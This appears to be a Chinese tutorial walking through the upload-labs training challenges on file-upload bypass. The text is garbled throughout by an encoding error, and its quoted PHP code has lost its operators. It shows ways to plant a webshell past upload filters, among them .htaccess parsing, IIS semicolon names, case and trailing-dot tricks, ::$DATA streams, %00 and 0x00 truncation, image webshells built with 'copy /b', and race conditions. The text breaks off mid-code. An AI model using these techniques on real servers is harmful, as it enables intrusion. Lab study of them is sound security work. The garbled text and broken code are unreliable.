å¾ˆå¤šç½‘ç«™éƒ½æ˜¯ç§Ÿç”¨æœåŠ¡å™¨å’Œè™šæ‹Ÿä¸»æœºçš„ï¼Œå…¶æœåŠ¡å™¨çš„é…ç½®æˆ‘ä»¬å¹¶ä¸èƒ½æ”¹ã€‚å½“æˆ‘ä»¬æœ‰ç‰¹æ®Šè¦æ±‚æ—¶ï¼Œæ¯”å¦‚å®šä¹‰æœ€ç®€å•çš„404ï¼ˆé¡µé¢æœªæ‰¾åˆ°ï¼‰çš„é”™è¯¯é¡µé¢ï¼Œæˆ‘ä»¬å°±åªèƒ½é€šè¿‡apacheé…ç½®çš„æ‰©å±•é…ç½®ï¼ˆæˆ–è€…è¯´æ˜¯å­é…ç½®ï¼‰æ¥æ›´æ”¹æ‰©å±•åŸæœåŠ¡å™¨çš„é…ç½®ã€‚è¿™ä¸ªé…ç½®å°±æ˜¯.htaccessæ–‡ä»¶ï¼Œä»–æ˜¯apacheä¸‹çš„http.confæ–‡ä»¶çš„å»¶ç»­ã€‚ æˆ‘ä»¬åªè¦æŠŠè¿™ä¸ªæ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªjpgå•Šä¹‹ç±»çš„å¯ä¸Šä¼ çš„åç¼€åæ–‡ä»¶ä¸Šå»ï¼Œé‚£ä¹ˆapacheéƒ½ä¼šå½“ä½œphpæ–‡ä»¶æ¥è§£æï¼Œæˆ‘è¿™é‡Œå°±ä¸ä¸Šä¼ äº†ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨uploadæ–‡ä»¶å¤¹ä¸­æ”¾è¿™ä¹ˆä¸¤ä¸ªæ–‡ä»¶ï¼š æµè§ˆå™¨è®¿é—®ä¸€äº›è¿™ä¸ªtu.jpgæ–‡ä»¶ï¼Œçœ‹æ•ˆæœ è¿™ä¸ªtu.jpgæ–‡ä»¶å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ–‡ä»¶æ”¹çš„åå­—ï¼Œvstartä¸­æœ‰ã€‚ åˆ†å·é…åˆIISè§£ææ¼æ´è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹å¼æ˜¯é€šè¿‡åˆ†å·æ¥å‘½åï¼Œè¿™æ˜¯ä¸€ä¸ªwindows2003ä¸Šçš„IISæœåŠ¡çš„è§£ææ¼æ´ æ¼”ç¤ºï¼š ç„¶åé€šè¿‡æµè§ˆå™¨æ¥è®¿é—®ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ æœ¨é©¬æ‰§è¡Œäº†ã€‚ ç„¶åå¤§å®¶åœ¨ä¸‹é¢ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶å°±è¡Œäº†ï¼Œæˆ‘è¿™é‡Œå°±ä¸æ¼”ç¤ºäº† å†’å·é…åˆPHP å’Œ Windowsæ–‡ä»¶å‘½åç¯å¢ƒçš„å åŠ ç‰¹æ€§å¦å¤–ä¸€ç§æ–¹æ³•å°±æ˜¯åˆ©ç”¨PHP å’Œ Windowsç¯å¢ƒçš„å åŠ ç‰¹æ€§ï¼Œä»¥ä¸‹ç¬¦å·åœ¨æ­£åˆ™åŒ¹é…æ—¶çš„ç›¸ç­‰æ€§ï¼š åˆ©ç”¨PHP å’Œ Windowsç¯å¢ƒçš„å åŠ ç‰¹æ€§ï¼Œåœ¨windowsç›´æ¥ä¿®æ”¹æ–‡ä»¶åç§°ï¼Œè‚¯å®šæ˜¯ä¸è®©ä½ åŠ å†’å·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»¥å›¾ç‰‡çš„æ ¼å¼ä¸Šä¼ ï¼Œç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç§°ï¼ŒåŠ ä¸Šå†’å·ï¼Œä¸Šä¼ ä¸€ä¸ªåä¸º 123.php:.jpg çš„æ–‡ä»¶ ä¸Šä¼ ä¸Šå»ä¹‹åçš„æ•ˆæœï¼Œç”±äºæ–‡ä»¶åç§°ä¸å…è®¸å‡ºç°å†’å·ï¼Œæ‰€æœ‰windowså°±å°†å†’å·å’Œåé¢çš„å­—ç¬¦éƒ½å»æ‰äº†ï¼Œå°±å‰©ä¸‹123.phpäº†ï¼Œä½†æ˜¯æœ‰ä¸ªç‚¹å°±æ˜¯ï¼Œæ–‡ä»¶ä¸º0kb ç„¶åå°†æ–‡ä»¶åæ”¹ä¸º 123. æˆ– 123. æˆ– 123. æˆ– 123. åå†æ¬¡ä¸Šä¼ ï¼Œé‡å†™ 123.php æ–‡ä»¶å†…å®¹ï¼ŒWebshellä»£ç å°±ä¼šå†™å…¥åŸæ¥çš„ 123.php ç©ºæ–‡ä»¶ä¸­ã€‚ æ•ˆæœï¼šå†…å®¹åˆæœ‰äº† æ‰€ä»¥è¿™ç§æ–¹å¼åˆ†ä¸¤æ­¥ï¼š1ä¸Šä¼ æ–‡ä»¶ï¼Œ2è¿½åŠ å†™å…¥å†…å®¹ã€‚ 3-5 ç¬¬äº”å…³ï¼šå¤§å°å†™æ··åˆç»•è¿‡ åˆ†æä»£ç ï¼Œå‘ç°ä»¥.htaccessä¸ºåç¼€çš„æ–‡ä»¶å·²ç»ä¸å…è®¸ä¸Šä¼ ï¼Œå¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶è¢«æ”¹åå­—äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šé¢çš„æ–¹å¼éƒ½ä¸è¡Œäº†ï¼Œä½†æ˜¯ $ file_ext strtolower( $file_ext); è½¬æ¢ä¸ºå°å†™ è¿™ä¸€å¥æ²¡æœ‰äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æ–‡ä»¶ååç¼€å¤§å°å†™æ··åˆç»•è¿‡ï¼ŒæŠŠ1.phpæ”¹ä¸º1.phPâ€¦æ¥ä¸Šä¼  è¿™æ ·çš„æ–‡ä»¶èƒ½æ‰§è¡Œå—ï¼Œå¯ä»¥çš„ï¼Œå› ä¸ºwindowsç³»ç»Ÿä¸åŒºåˆ†å¤§å°å†™ã€‚è®¿é—®ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ è™½ç„¶æŠ¥é”™äº†ï¼Œä½†æ˜¯æ„å‘³ç€è‚¯å®šæ‰§è¡Œäº†ï¼ŒæŠ¥é”™æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬ä»£ç çš„é—®é¢˜æ˜‚ã€‚ 3-6 ç¬¬å…­å…³ï¼šç©ºæ ¼å’Œç‚¹é…åˆç»•è¿‡é‡Œé¢çš„ä»£ç å°†ä¸Šä¼ çš„æ–‡ä»¶åéƒ½æ”¹ä¸ºå°å†™äº†ï¼Œé‚£ä¹ˆä¸Šé¢çš„æ–¹æ³•å°±ä¸è¡Œäº†ã€‚ åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹**ï¼Œå†™æˆ1.php .ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª.ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1.php 3-7 ä¹Ÿæ˜¯ç©ºæ ¼å’Œç‚¹é…åˆç»•è¿‡ åŸç†åŒPass-06ï¼Œæ–‡ä»¶åååŠ ç‚¹å’Œç©ºæ ¼ï¼Œæ”¹æˆ 1.php. ï¼Œè¿™ä¸ªæˆ‘ä»¬å°±ä¸æ¼”ç¤ºäº† 3-8 ç¬¬å…«å…³ï¼šåŸºäºæ–‡ä»¶æµç‰¹æ€§**::$DATAæ¥ç»•è¿‡windowsä¸‹çš„ntfsæ–‡ä»¶æµç‰¹æ€§æ¥ç©çš„ã€‚ åˆ†æä»£ç ï¼Œå°‘äº† $ file_ext str_ireplace(â€˜:: $DATAâ€˜, â€˜â€˜, $ file_ext);å»é™¤å­—ç¬¦ä¸²:: $DATA è¿™ä¸€å¥ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ï¼Œæ–‡ä»¶åæ”¹ä¸º1.php::$DATA , ä¸Šä¼ æˆåŠŸåä¿å­˜çš„æ–‡ä»¶åå…¶å®æ˜¯1.php 3-9 ç¬¬ä¹å…³ï¼šç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡ åŸç†åŒPass-06ï¼Œä¸Šä¼ æ–‡ä»¶åååŠ ä¸Šç‚¹+ç©ºæ ¼+ç‚¹ï¼Œæ”¹ä¸º 1.php. . ï¼Œè¿™é‡Œæˆ‘å°±ä¸æ¼”ç¤ºäº† 3-10 åŒå†™ç»•è¿‡ åˆ†æä»£ç ï¼Œç”±äº $ file_name str_ireplace( $deny_ext,â€â€, $file_name); åªå¯¹æ–‡ä»¶åç¼€åè¿›è¡Œä¸€æ¬¡è¿‡æ»¤ï¼Œè¿™æ ·çš„è¯ï¼ŒåŒå†™æ–‡ä»¶åç»•è¿‡ï¼Œæ–‡ä»¶åæ”¹æˆ1.pphphp ç™½åå•æ–¹å¼å¦‚ä¸‹ 3-11 ç¬¬åä¸€å…³ï¼š%00æˆªæ–­è¿™ä¸ªå±äºç™½åå•ç»•è¿‡ï¼Œè¿™æ˜¯phpè¯­è¨€è‡ªèº«çš„é—®é¢˜ï¼Œphpä½ç‰ˆæœ¬å­˜åœ¨çš„æ¼æ´ $is_upload false; $msg null; if(isset($_POST[â€˜submitâ€™])){ $ext_arr array(â€˜jpgâ€™,â€™pngâ€™,â€™gifâ€™); $file_ext substr($_FILES[â€˜upload_fileâ€™] [â€˜nameâ€™],strrpos($_FILES[â€˜upload_fileâ€™][â€˜nameâ€™],â€.â€)+1); if(in_array($file_ext,$ext_arr)){ $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $img_path $_GET[â€˜save_pathâ€™].â€â€œ.rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg â€˜ä¸Šä¼ å‡ºé”™ï¼â€™; } } else{ $msg â€œåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼â€; } } åˆ†æä»£ç ï¼Œè¿™æ˜¯ä»¥æ—¶é—´æˆ³çš„æ–¹å¼å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œå‘½åï¼Œä½¿ç”¨ä¸Šä¼ è·¯å¾„å%00æˆªæ–­ç»•è¿‡ï¼Œä¸è¿‡è¿™éœ€è¦å¯¹æ–‡ä»¶æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ¯”å¦‚è¯´åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä¸Šä¼ çš„æ–‡ä»¶åå†™æˆ1.jpg, save_pathæ”¹æˆ..upload1.php%00 (1.php%00.jpgç»è¿‡urlè½¬ç åä¼šå˜ä¸º1.php\\000.jpg)ï¼Œæœ€åä¿å­˜ä¸‹æ¥çš„æ–‡ä»¶å°±æ˜¯1.php å…¶ä¸­ä¸‹é¢è¿™ä¸ªè·¯å¾„è¢«%00ç»™æˆªæ–­äº†ï¼Œåé¢çš„è·¯å¾„ä¸ç”Ÿæ•ˆäº†ã€‚ ä¿®å¤å»ºè®¾ï¼š phpç‰ˆæœ¬è¦å°äº5.3.4ï¼Œ5.3.4åŠä»¥ä¸Šå·²ç»ä¿®å¤è¯¥é—®é¢˜ï¼›å¹¶ä¸”magic_quotes_gpcéœ€è¦ä¸ºOFFçŠ¶æ€ æ³¨æ„ï¼Œè¿™é‡Œè¿˜æœ‰ä¸ªæ¼æ´ï¼Œå¦‚æœç›®å½•æœ‰å†™å…¥æƒé™çš„è¯æˆ–è€…è¯´å¯ä»¥ä¿®æ”¹çš„è¯ï¼Œæ˜¯æ¯”è¾ƒå±é™©çš„ æ¯”å¦‚ï¼šè¿™å°±æ˜¯windowsçš„ç‰¹æ€§ï¼Œå¦‚æœæ–‡ä»¶å¤¹çš„åå­—ä¸ºxx.aspï¼Œé‚£ä¹ˆå®ƒé‡Œé¢çš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œaspæ–‡ä»¶ã€‚ 3-12ç¬¬åäºŒå…³ï¼š0x00ç»•è¿‡$is_upload false; $msg null; if(isset($_POST[â€˜submitâ€™])){ $ext_arr array(â€˜jpgâ€™,â€™pngâ€™,â€™gifâ€™); $file_ext substr($_FILES[â€˜upload_fileâ€™] [â€˜nameâ€™],strrpos($_FILES[â€˜upload_fileâ€™][â€˜nameâ€™],â€.â€)+1); if(in_array($file_ext,$ext_arr)){ $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $img_path $_POST[â€˜save_pathâ€™].â€â€œ.rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg â€œä¸Šä¼ å¤±è´¥â€; } } else { $msg â€œåªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼â€; } } åŸç†åŒPass-11**ï¼Œä¸Šä¼ è·¯å¾„0x00ç»•è¿‡ã€‚åˆ©ç”¨Burpsuiteçš„HexåŠŸèƒ½å°†save_pathæ”¹æˆ..upload1.phpã€äºŒè¿›åˆ¶00ã€‘å½¢å¼ ç„¶åå›æ¥çœ‹ï¼Œå°±å‡ºç°äº†å£ä¸€æ ·çš„æ•ˆæœ ä¸Šä¼ æˆåŠŸäº† 3-13 ç¬¬åä¸‰å…³ï¼šç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥è¿™ä¸ªæˆ‘ä»¬ä¸Šé¢è®²è¿‡äº†çš„ã€‚ function getReailFileType($filename){ $file fopen($filename, â€œrbâ€); $bin fread($file, 2); åªè¯»2å­—èŠ‚ fclose($file); $strInfo @unpack(â€œC2charsâ€, $bin); $typeCode intval($strInfo[â€˜chars1â€™].$strInfo[â€˜chars2â€™]); $fileType â€˜â€™; switch($typeCode){ case 255216: $fileType â€˜jpgâ€™; break; case 13780: $fileType â€˜pngâ€™; break; case 7173: $fileType â€˜gifâ€™; break; default: $fileType â€˜unknownâ€™; } return $fileType; } $is_upload false; $msg null; if(isset($_POST[â€˜submitâ€™])){ $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $file_type getReailFileType($temp_file); if($file_type â€˜unknownâ€™){ $msg â€œæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼â€; }else{ $img_path UPLOAD_PATH.â€â€œ.rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg â€œä¸Šä¼ å‡ºé”™ï¼â€; } } } ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥ï¼Œæ·»åŠ GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´GIF89aï¼Œç»•è¿‡GIFå›¾ç‰‡æ£€æŸ¥ã€‚ æˆ–è€…æˆ‘ä»¬ä½¿ç”¨å‘½ä»¤copy 1.jpg b + shell.php a webshell.jpgï¼Œå°†phpä¸€å¥è¯è¿½åŠ åˆ°jpgå›¾ç‰‡æœ«å°¾ï¼Œä»£ç ä¸å…¨çš„è¯ï¼Œäººå·¥è¡¥å……å®Œæ•´ã€‚å½¢æˆä¸€ä¸ªåŒ…å«Webshellä»£ç çš„æ–°jpgå›¾ç‰‡ï¼Œç„¶åç›´æ¥ä¸Šä¼ å³å¯ã€‚ä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰åŠæ³•æ‹¿åˆ°shellï¼Œåº”ä¸ºæˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡é©¬æ— æ³•è¢«è§£ææˆphpå½¢å¼ï¼Œé€šå¸¸å›¾ç‰‡é©¬é…åˆ%00æˆ–è€…0x00æˆªæ–­ä¸Šä¼ ï¼Œæˆ–è€…é…åˆè§£ææ¼æ´ 3-14 ç¬¬åå››å…³ image_type_to_extension()ç»•è¿‡è¿™ä¸ªæˆ‘ä»¬è®²è¿‡äº†ã€‚ function isImage($filename){ $types â€˜.jpeg|.png|.gifâ€™; if(file_exists($filename)){ $info getimagesize($filename); $ext image_type_to_extension($info[2]); if(stripos($types,$ext)0){ return $ext; }else{ return false; } }else{ return false; } } $is_upload false; $msg null; if(isset($_POST[â€˜submitâ€™])){ $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $res isImage($temp_file); if(!$res){ $msg â€œæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼â€; }else{ $img_path UPLOAD_PATH.â€â€œ.rand(10, 99).date(â€œYmdHisâ€).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg â€œä¸Šä¼ å‡ºé”™ï¼â€; } } } getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå°ºå¯¸ ï¼Œç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 GIFï¼Œ2 JPGï¼Œ3 PNGï¼Œ4 SWFï¼Œ5 PSDï¼Œ6 BMPï¼Œ7 TIFF(intel byte order)ï¼Œ8 TIFF(motorola byte order)ï¼Œ9 JPCï¼Œ10 JP2ï¼Œ11 JPXï¼Œ12 JB2ï¼Œ13 SWCï¼Œ14 IFFï¼Œ15 WBMPï¼Œ16 XBMè¿™é‡Œæœ‰è¯¦è§£ï¼šhttps://blog.csdn.net/sanbingyutuoniao123/article/details/52166617 image_type_to_extension() å‡½æ•°ç”¨äºè·å–å›¾ç‰‡åç¼€ 3-15 ç¬¬åäº”å…³: exif_imagetype()ç»•è¿‡å’Œ14å·®ä¸å¤šï¼Œä¸è®²äº†ã€‚ function isImage($filename){ éœ€è¦å¼€å¯php_exifæ¨¡å— $image_type exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return â€œgifâ€; break; case IMAGETYPE_JPEG: return â€œjpgâ€; break; case IMAGETYPE_PNG: return â€œpngâ€; break; default: return false; break; } } $is_upload false; $msg null; if(isset($_POST[â€˜submitâ€™])){ $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $res isImage($temp_file); if(!$res){ $msg â€œæ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼â€; }else{ $img_path UPLOAD_PATH.â€â€œ.rand(10, 99).date(â€œYmdHisâ€).â€.â€.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload true; } else { $msg â€œä¸Šä¼ å‡ºé”™ï¼â€; } } } å…¶ä¸­ï¼šexif_imagetype() æ­¤å‡½æ•°æ˜¯phpå†…ç½®å‡½æ•°ï¼Œç”¨æ¥è·å–å›¾ç‰‡ç±»å‹ 3-16 ç¬¬åå…­å…³ï¼šäºŒæ¬¡æ¸²æŸ“ç»•è¿‡è¿™ä¸ªå¤šäº†äºŒæ¬¡æ¸²æŸ“ï¼Œæ¯”è¾ƒéš¾çš„ä¸€ä¸ªã€‚ $is_upload false; $msg null; if (isset($_POST[â€˜submitâ€™])){ è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„ $filename $_FILES[â€˜upload_fileâ€™][â€˜nameâ€™]; $filetype $_FILES[â€˜upload_fileâ€™][â€˜typeâ€™]; $tmpname $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $target_pathUPLOAD_PATH.â€™â€˜.basename($filename); è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å $fileext substr(strrchr($filename,â€.â€),1); åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ if(($fileext â€œjpgâ€) ($filetypeâ€imagejpegâ€)){ if(move_uploaded_file($tmpname,$target_path)){ ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im imagecreatefromjpeg($target_path); if($im false){ $msg â€œè¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼â€; @unlink($target_path); }else{ ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename strval(rand()).â€.jpgâ€; æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path UPLOAD_PATH.â€™â€˜.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload true; } } else { $msg â€œä¸Šä¼ å‡ºé”™ï¼â€; } }else if(($fileext â€œpngâ€) ($filetypeâ€imagepngâ€)){ if(move_uploaded_file($tmpname,$target_path)){ ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im imagecreatefrompng($target_path); if($im false){ $msg â€œè¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼â€; @unlink($target_path); }else{ ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename strval(rand()).â€.pngâ€; æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path UPLOAD_PATH.â€™â€˜.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload true; } } else { $msg â€œä¸Šä¼ å‡ºé”™ï¼â€; } }else if(($fileext â€œgifâ€) ($filetypeâ€imagegifâ€)){ if(move_uploaded_file($tmpname,$target_path)){ ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡ $im imagecreatefromgif($target_path); if($im false){ $msg â€œè¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼â€; @unlink($target_path); }else{ ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å srand(time()); $newfilename strval(rand()).â€.gifâ€; æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰ $img_path UPLOAD_PATH.â€™â€˜.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload true; } } else { $msg â€œä¸Šä¼ å‡ºé”™ï¼â€; } }else{ $msg â€œåªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼â€; } } åŸç†ï¼šæ˜¯å°†ç”¨æˆ·ä¸Šä¼ è¿‡æ¥çš„æ–‡ä»¶æ•°æ®é‡æ–°è¯»å–ä¿å­˜åˆ°å¦å¤–ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆåœ¨è¯»å–å†™å…¥çš„è¿‡ç¨‹ä¸­ï¼Œå°†ç‰¹æ®Šçš„æ•°æ®å‰”é™¤æ‰äº†ã€‚å°†ä¸€ä¸ªæ­£å¸¸æ˜¾ç¤ºçš„å›¾ç‰‡ï¼Œä¸Šä¼ åˆ°æœåŠ¡å™¨ã€‚å¯»æ‰¾å›¾ç‰‡è¢«æ¸²æŸ“åä¸åŸå§‹å›¾ç‰‡éƒ¨åˆ†å¯¹æ¯”ä»ç„¶ç›¸åŒçš„æ•°æ®å—éƒ¨åˆ†ï¼Œå°†Webshellä»£ç æ’åœ¨è¯¥éƒ¨åˆ†ï¼Œç„¶åä¸Šä¼ ã€‚å…·ä½“å®ç°éœ€è¦è‡ªå·±ç¼–å†™Pythonç¨‹åºï¼Œäººå·¥å°è¯•åŸºæœ¬æ˜¯ä¸å¯èƒ½æ„é€ å‡ºèƒ½ç»•è¿‡æ¸²æŸ“å‡½æ•°çš„å›¾ç‰‡webshellçš„ã€‚ è¿™é‡Œæä¾›ä¸€ä¸ªåŒ…å«ä¸€å¥è¯webshellä»£ç å¹¶å¯ä»¥ç»•è¿‡PHPçš„imagecreatefromgifå‡½æ•°çš„GIFå›¾ç‰‡ç¤ºä¾‹ã€‚ phpå›¾åƒäºŒæ¬¡æ¸²æŸ“ï¼š https://blog.csdn.net/hitwangpeng/article/details/48661433https://blog.csdn.net/hitwangpeng/article/details/46548849 https://xz.aliyun.com/t/2657 è¿™ä¸¤ä¸ªè®²çš„è¿˜å¯ä»¥ æ¯”å¦‚ç”¨æˆ‘ä»¬ä¹‹å‰åšå¥½çš„å›¾ç‰‡æœ¨é©¬ç»§ç»­ä¸Šä¼ ä¸€ä¸‹ ç„¶åæ–‡ä»¶å·²ç»åˆ°äº†æœåŠ¡å™¨ï¼Œå½“æˆ‘ä»¬é€šè¿‡ç¼–è¾‘å™¨æ‰“å¼€è¿™ä¸ªå›¾ç‰‡æ•°æ®æ—¶ï¼Œå·²ç»çœ‹ä¸åˆ°æˆ‘ä»¬åŠ åˆ°å›¾ç‰‡ä¸­çš„æœ¨é©¬æ•°æ®äº† åˆ†åˆ«ä¸Šä¼ ä¸€ä¸‹è¿™åŠä¸ªæ–‡ä»¶ï¼Œçœ‹çœ‹å“ªä¸ªè¢«å¹²æ‰äº†ã€‚ æœ€åå‘ç°å°±gifé‚£ä¸ªå›¾ç‰‡ä¸Šä¼ ç©ä¹‹åï¼Œæœ¨é©¬ç¨‹åºä¾ç„¶è¿˜åœ¨ã€‚ è¯´æ˜ä»€ä¹ˆï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªåšå¼ºçš„æœ¨é©¬ï¼Œæˆ‘ä»¬å°±å°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜ä¸‹æ¥ï¼Œå¤§å®¶å°±æ˜¯è¿™æ ·ç”¨å¾ˆå¤šçš„æœ¨é©¬å›¾ç‰‡å»è¯•ï¼Œè¯•å‡ºæ¥çš„ç»“æœï¼Œæ²¡å¹²æ‰çš„å°±ä¿å­˜ä¸‹æ¥ã€‚åŸå› å°±æ˜¯æœ‰äº›æœ¨é©¬ç¨‹åºæ‰€åœ¨çš„ä½ç½®ï¼ŒäºŒæ¬¡æ¸²æŸ“ä¹Ÿæ²¡æœ‰å‘ç°ã€‚ 3-17 ç¬¬åä¸ƒå…³ï¼šæ¡ä»¶ç«äº‰ä¹‹æ—¶é—´ç«äº‰å”¯å“ä¼šå°±å‡ºç°è¿‡è¿™ä¸ªæ¼æ´ï¼Œå«åšæ—¶é—´ç«äº‰æ¼æ´ã€‚è¿™ä¹Ÿæ˜¯ctfè€ƒè¯•çš„æ—¶å€™ç»å¸¸ä¼šè€ƒçš„é¢˜ç›®ã€‚ CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚å‘å±•è‡³ä»Šï¼Œå·²ç»æˆä¸ºå…¨çƒèŒƒå›´ç½‘ç»œå®‰å…¨åœˆæµè¡Œçš„ç«èµ›å½¢å¼ï¼Œ2013å¹´å…¨çƒä¸¾åŠäº†è¶…è¿‡äº”ååœºå›½é™…æ€§CTFèµ›äº‹ã€‚è€ŒDEFCONä½œä¸ºCTFèµ›åˆ¶çš„å‘æºåœ°ï¼ŒDEFCON CTFä¹Ÿæˆä¸ºäº†ç›®å‰å…¨çƒæœ€é«˜æŠ€æœ¯æ°´å¹³å’Œå½±å“åŠ›çš„CTFç«èµ›ï¼Œç±»ä¼¼äºCTFèµ›åœºä¸­çš„â€œä¸–ç•Œæ¯â€ ã€‚ çœ‹ä»£ç  $is_upload false; $msg null; if(isset($_POST[â€˜submitâ€™])){ $ext_arr array(â€˜jpgâ€™,â€™pngâ€™,â€™gifâ€™); $file_name $_FILES[â€˜upload_fileâ€™][â€˜nameâ€™]; $temp_file $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™]; $file_ext substr($file_name,strrpos($file_name,â€.â€)+1); $upload_file UPLOAD_PATH . â€˜â€˜ . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path UPLOAD_PATH . â€˜â€˜. rand(10, 99).date(â€œYmdHisâ€).â€.â€.$file_ext; rename($upload_file, $img_path); $is_upload true; }else{ $msg 